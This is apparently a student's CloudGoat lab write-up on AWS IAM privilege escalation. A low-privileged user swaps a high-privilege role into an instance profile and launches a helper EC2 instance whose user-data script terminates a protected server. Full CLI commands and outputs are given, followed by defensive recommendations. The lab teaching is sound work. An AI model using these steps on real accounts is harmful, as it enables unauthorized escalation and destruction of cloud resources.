# IAM Privilege Escalation by Attachment

## Solution

This challenge demonstrates how a low-privileged IAM user can escalate privileges by abusing IAM instance profile permissions. In this lab, the starting user is **Kerrigan**, a limited IAM user. Kerrigan cannot directly terminate the protected target EC2 instance. However, Kerrigan has permissions to modify an IAM instance profile and launch EC2 instances.

The privilege escalation path was:

```text
Kerrigan
1. Identify vulnerable instance profile
2. Remove Meek role
3. Add Mighty role
4. Launch helper EC2 using modified instance profile
5. Helper EC2 receives Mighty permissions
6. Helper EC2 terminates the target instance
```

---

## Lab Objective

The objective of this challenge was to terminate the protected EC2 instance named:

```text
cg-super-critical-security-server-iam_privesc_by_attachment-cgid7c11loyvlf
```
The target instance ID was:
```text
i-007df2afb88d80562
```
The important misconfiguration was that Kerrigan had permissions to manipulate IAM instance profiles. This allowed Kerrigan to replace a low-privilege role with a high-privilege role and use that role indirectly through a helper EC2 instance.

---

# a. Deployed the CloudGoat Lab Environment

I first initialized and deployed the Terraform environment.

## Commands Executed

```bash
terraform init
terraform apply
```

When Terraform asked for confirmation, I typed:

```text
yes
```

## Explanation

`terraform init` initializes the Terraform working directory and downloads the required provider plugins.

`terraform apply` creates the AWS resources needed for the lab. This included:

* Kerrigan IAM user
* Meek IAM role
* Mighty IAM role
* IAM instance profile
* Target EC2 instance
* VPC
* Subnet
* Security group
* Internet gateway

After Terraform completed, I viewed the outputs:

```bash
terraform output
```

## Important Values Identified

```text
Target Instance ID:
i-007df2afb88d80562

Instance Profile:
cg-ec2-meek-instance-profile-iam_privesc_by_attachment-cgid7c11loyvlf

Meek Role:
cg-ec2-meek-role-iam_privesc_by_attachment-cgid7c11loyvlf

Mighty Role:
cg-ec2-mighty-role-iam_privesc_by_attachment-cgid7c11loyvlf

Subnet ID:
subnet-040d6664a3fded846

Security Group ID:
sg-0b7d1320eb5437e80

Region:
us-east-1
```

These values were important because they were used throughout the attack.

---

# b. Configured the Kerrigan User

Terraform created a limited IAM user named Kerrigan. I retrieved Kerrigan's secret key using:

```bash
terraform output -raw cloudgoat_output_kerrigan_secret_key
```

Then I configured the AWS CLI profile for Kerrigan:

```bash
aws configure --profile kerrigan
```

I entered the following values:

```text
AWS Access Key ID: Kerrigan access key from Terraform output
AWS Secret Access Key: Kerrigan secret key from Terraform output
Default region name: us-east-1
Default output format: json
```

Then I verified the active identity:

```bash
aws sts get-caller-identity --profile kerrigan
```

## Expected Output

```json
{
  "UserId": "...",
  "Account": "574246332158",
  "Arn": "arn:aws:iam::574246332158:user/cg-kerrigan-iam_privesc_by_attachment-cgid7c11loyvlf"
}
```

## Explanation

This step confirmed that I was using the limited Kerrigan user and not my admin account.

This was important because the challenge must be completed from the perspective of the low-privileged user. If I used the admin account, the privilege escalation would not be demonstrated properly.

---

# c. Verified Kerrigan Cannot Terminate the Target Directly

Before attempting privilege escalation, I tested whether Kerrigan could directly terminate the target EC2 instance.

## Command Executed

```bash
aws ec2 terminate-instances \
  --instance-ids i-007df2afb88d80562 \
  --profile kerrigan
```

## Result

The command failed with an authorization error:

```text
UnauthorizedOperation
```

## Explanation

This was an important proof step.

It showed that Kerrigan did not have direct permission to run:

```text
ec2:TerminateInstances
```

This means Kerrigan could not complete the objective directly.
The failure proved that privilege escalation was required.

---

# d. Identified the Vulnerable Instance Profile

Next, I listed the IAM instance profiles available to Kerrigan.

## Command Executed

```bash
aws iam list-instance-profiles \
  --profile kerrigan \
  --query "InstanceProfiles[*].[InstanceProfileName,Roles[*].RoleName]" \
  --output table
```

## Output

```text
cg-ec2-meek-instance-profile-iam_privesc_by_attachment-cgid7c11loyvlf
cg-ec2-meek-role-iam_privesc_by_attachment-cgid7c11loyvlf
```

## Explanation

This showed that the instance profile currently contained the low-privilege **Meek** role.

An IAM instance profile is the object that allows an EC2 instance to receive IAM role permissions. EC2 instances do not attach IAM roles directly. Instead, they receive role permissions through an instance profile.

This step was important because the challenge name is **Privilege Escalation by Attachment**, so the instance profile was the main object to investigate.

At this point, I identified:

```text
Instance Profile:
cg-ec2-meek-instance-profile-iam_privesc_by_attachment-cgid7c11loyvlf

Current Role:
cg-ec2-meek-role-iam_privesc_by_attachment-cgid7c11loyvlf
```

---

# e. Removed the Meek Role from the Instance Profile

An instance profile can contain only one IAM role. Therefore, before adding the high-privilege Mighty role, I first removed the low-privilege Meek role.

## Command Executed

```bash
aws iam remove-role-from-instance-profile \
  --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment-cgid7c11loyvlf \
  --role-name cg-ec2-meek-role-iam_privesc_by_attachment-cgid7c11loyvlf \
  --profile kerrigan
```

## Result

The command returned no output, which indicates success.

## Explanation

This was the first main privilege escalation action.

Kerrigan should not normally be able to modify which role is inside an instance profile. However, in this lab, Kerrigan had permission to remove a role from an instance profile.

This permission is dangerous because it allows a user to change what permissions future EC2 instances will receive.

---

# f. Added the Mighty Role to the Same Instance Profile

After removing Meek, I added the high-privilege Mighty role to the same instance profile.

## Command Executed

```bash
aws iam add-role-to-instance-profile \
  --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment-cgid7c11loyvlf \
  --role-name cg-ec2-mighty-role-iam_privesc_by_attachment-cgid7c11loyvlf \
  --profile kerrigan
```

## Result

The command returned no output, which indicates success.

## Explanation

This was the main privilege escalation step.

The instance profile name still contained the word `meek`, but the actual role inside the profile was changed from Meek to Mighty.

This means any EC2 instance launched with that instance profile would now receive the permissions of the Mighty role.

---

# g. Verified the Role Swap

After adding the Mighty role, I confirmed that the instance profile now contained Mighty instead of Meek.

## Command Executed

```bash
aws iam list-instance-profiles \
  --profile kerrigan \
  --query "InstanceProfiles[*].[InstanceProfileName,Roles[*].RoleName]" \
  --output table
```

## Output

```text
cg-ec2-meek-instance-profile-iam_privesc_by_attachment-cgid7c11loyvlf
cg-ec2-mighty-role-iam_privesc_by_attachment-cgid7c11loyvlf
```

## Explanation

This output confirmed that the privilege escalation condition was created successfully.

Before:

```text
Instance Profile → Meek Role
```

After:

```text
Instance Profile → Mighty Role
```

Even though the profile name still said `meek`, the attached role was now `mighty`.

This was an important screenshot because it proved that the role replacement worked.

---

# h. Created the Helper EC2 User Data Script

Next, I created a user-data script that would run automatically when a new helper EC2 instance started.

## Command Executed

```bash
cat > helper-userdata.sh <<'EOF'
#!/bin/bash
sleep 60
aws ec2 terminate-instances \
  --instance-ids i-007df2afb88d80562 \
  --region us-east-1
EOF
```

## Explanation

This script does three important things:

1. It runs automatically when the helper EC2 instance starts.
2. It waits 60 seconds to allow the instance and IAM role credentials to become ready.
3. It runs the EC2 termination command against the target instance.

The script does not use Kerrigan's local credentials. Instead, when it runs inside the helper EC2 instance, AWS CLI automatically uses the IAM role credentials attached to that EC2 instance.

Because the helper EC2 uses the modified instance profile, the script runs with Mighty role permissions.

---

# i. Retrieved a Valid Amazon Linux AMI

To launch a helper EC2 instance, I needed a valid Amazon Linux AMI.

## Command Executed

```bash
aws ec2 describe-images \
  --owners amazon \
  --filters "Name=name,Values=al2023-ami-*-x86_64" \
            "Name=state,Values=available" \
  --query "sort_by(Images,&CreationDate)[-1].ImageId" \
  --output text \
  --profile kerrigan
```

## Output

```text
ami-03120525e2a3df46f
```

## Explanation

This command searched for the latest available Amazon Linux 2023 AMI.

This was important because earlier, choosing a random AMI returned an EKS node AMI, which was not ideal for a normal helper EC2 instance. Using an Amazon Linux 2023 AMI made the helper instance more suitable for running the user-data script.

---

# j. Launched the Helper EC2 Instance

I launched a new helper EC2 instance using the modified instance profile.

## Command Executed

```bash
aws ec2 run-instances \
  --image-id ami-03120525e2a3df46f \
  --instance-type t3.micro \
  --subnet-id subnet-040d6664a3fded846 \
  --security-group-ids sg-0b7d1320eb5437e80 \
  --iam-instance-profile Name=cg-ec2-meek-instance-profile-iam_privesc_by_attachment-cgid7c11loyvlf \
  --user-data file://helper-userdata.sh \
  --profile kerrigan
```

## Explanation

This launched a helper EC2 instance.

The important part of the command was:

```bash
--iam-instance-profile Name=cg-ec2-meek-instance-profile-iam_privesc_by_attachment-cgid7c11loyvlf
```

Although the profile name contained `meek`, the role inside it had already been replaced with Mighty.

Therefore, the helper EC2 instance inherited the Mighty role permissions.

The second important part was:

```bash
--user-data file://helper-userdata.sh
```

This attached the startup script to the helper instance. When the helper instance booted, the script executed and attempted to terminate the target EC2 instance.

---

# k. Verified the Target Instance Was Terminated

After waiting about one to two minutes, I checked the state of the target instance.

## Simple Verification Command

```bash
aws ec2 describe-instances \
  --instance-ids i-007df2afb88d80562 \
  --profile kerrigan \
  --query "Reservations[0].Instances[0].State.Name" \
  --output text
```

## Output

```text
terminated
```

## Detailed Verification Command

```bash
aws ec2 describe-instances \
  --instance-ids i-007df2afb88d80562 \
  --region us-east-1 \
  --profile kerrigan \
  --query "Reservations[].Instances[].{InstanceId:InstanceId,State:State.Name,Tags:Tags}" \
  --output json
```

## Output

```json
[
  {
    "InstanceId": "i-007df2afb88d80562",
    "State": "terminated",
    "Tags": [
      {
        "Key": "Scenario",
        "Value": "iam_privesc_by_attachment"
      },
      {
        "Key": "Purpose",
        "Value": "Target for privilege escalation scenario"
      },
      {
        "Key": "Name",
        "Value": "cg-super-critical-security-server-iam_privesc_by_attachment-cgid7c11loyvlf"
      },
      {
        "Key": "Stack",
        "Value": "CloudGoat"
      }
    ]
  }
]
```

## Explanation

The output showed that the target instance state changed to:

```text
terminated
```

This proved that the helper EC2 instance successfully used the Mighty role permissions to terminate the protected target instance.

This was the final proof that the privilege escalation attack succeeded.

---

# l. Cleaned Up the Helper Instance and Lab Resources

After taking screenshots, I cleaned up the lab environment.

First, I checked remaining EC2 instances:

```bash
aws ec2 describe-instances \
  --query "Reservations[*].Instances[*].[InstanceId,State.Name,Tags[?Key=='Name']|[0].Value]" \
  --output table
```

I found that the helper EC2 instance was still running:

```text
i-01d453461043abbcd    running
```

Because the helper instance was created manually, Terraform did not fully manage it. This caused Terraform destroy to hang until I terminated the helper instance manually.

## Terminated the Helper Instance

```bash
aws ec2 terminate-instances \
  --instance-ids i-01d453461043abbcd
```

## Ran Terraform Destroy Again

```bash
terraform destroy
```

When prompted, I typed:

```text
yes
```

Terraform completed the cleanup:

```text
Destroy complete! Resources: 4 destroyed.
```

## Verified Current Identity

Finally, I checked the current AWS identity:

```bash
aws sts get-caller-identity
```

Output:

```text
arn:aws:iam::574246332158:user/myadmin
```

This confirmed I was back on the admin account after cleanup.

---

# Reflection

## What was your approach?

My approach was to first confirm the starting identity and test Kerrigan's direct permissions. After verifying that Kerrigan could not terminate the target EC2 instance directly, I focused on the instance profile because the challenge name suggested privilege escalation by attachment. I discovered that Kerrigan could modify the instance profile by removing the Meek role and adding the Mighty role. Then I launched a helper EC2 instance using the modified profile and attached a user-data script to terminate the target instance.

## What was the biggest challenge?

The biggest challenge was understanding the difference between an IAM role and an IAM instance profile. The instance profile name still included the word `meek`, but the role inside the profile had changed to Mighty. Understanding that the profile name and the attached role are different was important.

## How did you overcome the challenge?

I verified each stage with AWS CLI commands. I listed the instance profiles before and after the role change to confirm that the Meek role was removed and the Mighty role was added. This made the attack flow clear.

## What led to the breakthrough?

The breakthrough happened when the instance profile showed the Mighty role attached. At that point, I understood that any new EC2 instance launched with that profile would inherit the Mighty role permissions. The helper EC2 then successfully terminated the target instance through its user-data script.

## On the Blue Side, How Can This Be Prevented?

This lab showed that instance profile permissions can be very dangerous when assigned to a low-privileged user. To defend against this attack:

1. Restrict `iam:AddRoleToInstanceProfile`.
2. Restrict `iam:RemoveRoleFromInstanceProfile`.
3. Restrict `iam:PassRole`.
4. Restrict who can launch EC2 instances with IAM roles.
5. Avoid assigning administrator permissions to EC2 roles unless absolutely required.
6. Monitor CloudTrail for instance profile role changes.
7. Alert on suspicious role swaps or privileged role attachments.
8. Apply least privilege to IAM users, roles, and policies.

---

# Conclusion

This challenge demonstrated a privilege escalation technique using IAM instance profile manipulation. Kerrigan could not directly terminate the target EC2 instance, but Kerrigan had permission to modify the instance profile. By removing the low-privilege Meek role and adding the high-privilege Mighty role, Kerrigan was able to launch a helper EC2 instance with elevated permissions. The helper instance ran a user-data script that terminated the protected target EC2 instance.

The main lesson is that IAM permissions related to roles, instance profiles, and EC2 launches must be tightly controlled. A user who can modify instance profiles and launch EC2 instances may be able to indirectly gain the permissions of a more powerful role.
